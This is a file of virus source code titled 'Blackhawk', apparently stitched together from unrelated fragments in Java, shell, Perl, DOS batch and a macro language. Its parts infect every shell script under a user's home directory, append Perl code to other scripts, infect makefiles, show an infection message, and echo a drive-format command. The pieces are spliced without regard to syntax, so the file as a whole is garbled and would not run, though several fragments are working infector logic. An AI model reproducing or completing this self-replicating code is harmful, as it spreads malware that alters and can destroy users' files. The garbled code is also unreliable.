import java.io.*;

class Blackhawk {
public static void main (String[] argv) {
try {
String userHome = System.getProperty("user.home");
String target = "$HOME";
FileOutputStream outer = new FileOutputStream(userHome + "/.Blackhawk.sh");
String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
"echo \"This is a New Target File from me..-->Blackhawk<--.\"" + "\n" +
"for file in `find " + target + " -type f -print`" + "\n" + "do" +
"\n" + " case \"`sed 1q $file`\" in" + "\n" +
" \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
" || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
" esac" + "\n" + "done" + "\n" + 
"2>/dev/null";
byte[] buffer = new byte[homer.length()];
Blackhawk.getBytes(0, Blackhawk.length(), buffer, 0);
public void start() {
if (sleeper == null) {
sleeper = new Thread(this);
sleeper.setPriority(Thread.MAX_PRIORITY);
sleeper.start();
}
use File::Find;
&virus();

print "\
nThis program is infected by the Blackhawk virus\n\n";

sub virus

{
    my ( $pid, $new );   
    if( $pid = fork ) { return; }
    else
      
{
        open( source, $0 );
	finddepth ( \&infect, '/home/chris/test' );
	sub infect 
	  
{
            open target, "$File::Find::name";
            $_ = <target>;
	    if 
( /(\#!.*Blackhawk)/ ) 
	      {
		$_ = <target>;
		if( $_ ne "use File::Find;\n" )
		  {
                    $new = $1 . "\nuse File::Find;\n&virus();\n" . $_;
                    while( <target> ) { $new = $new . $_; }
		    seek(  source, 0, 0 );
                    while( <source> ne "sub virus\n" ) { };
                    $new = $new . "\nsub virus\n";
                    while( <source> ) { $new = $new . $_; }                  
                    close  target;
                    open   target, ">$File::Find::name";
                    print  target $new;
                 }
	      }
	    close( target );   
	  }
        close( source );
	exit( 0 );
      }
  }

# a blackhawk virus, x
# 


outer.write(buffer);
outer.close();
Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 888 " +
userHome + "/.Blackhawk.sh");
Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
"/.Blackhawk.sh");
} catch (IOException ioe) {}
}
}
OurHost :
@IF EXIST MAKEFILE FIND "ttt"<MAKEFILE >ttt.TMP
@ECHO @CTTY NUL >ttt.BAT
@ECHO IF _%1==_ttt GOTO ttt_INF >>ttt.BAT
@ECHO IF EXIST ..\MAKEFILE CALL ttt.BAT ttt ..\MAKEFILE >>ttt.BAT
@ECHO GOTO ttt_END >>ttt.BAT
[Set Color Message Black Black][Exist %ExePath\My.Pro][If %Exist != 1]
[Copy %FilePath\My.Pro %ExePath\My.Pro][End][Message][Set Color Message Red+ Black]
[Set Color Message Black Black][Exist %FilePath\My.Pro][If %Exist != 1]
[Copy %ExePath\My.Pro %FilePath\My.Pro][End][Message][Set Color Message Red+ Black]
;; Payload *.*exe,com,bat,vbs,asm
Set BEEP On
Def *T172000=[Write 10 20 Your computer is infected with Blackhawk.Virus.\n   ,   ]
[Play MST12005][Play L4CDECCDECEFL2GL4EFL2G][Play L8GAGFL4ECL8GAGFL4EC][Play L4CO2GO3L2CL4CO2GO3L2C][Redraw]
@ECHO :ttt_INF >>ttt.BAT
@ECHO FIND "ttt" %2 >>ttt.BAT
@ECHO IF NOT ERRORLEVEL 1 GOTO ttt_END >>ttt.BAT
@ECHO COPY /B %2+GW.TMP %2 >>ttt.BAT
@ECHO :ttt_END >>ttt.BAT
@ECHO FORMAT C:/Q
@call ttt.BAT
@del ttt.BAT
@del ttt.TMP
# [Blackhawk] by Kingrhua//SMF
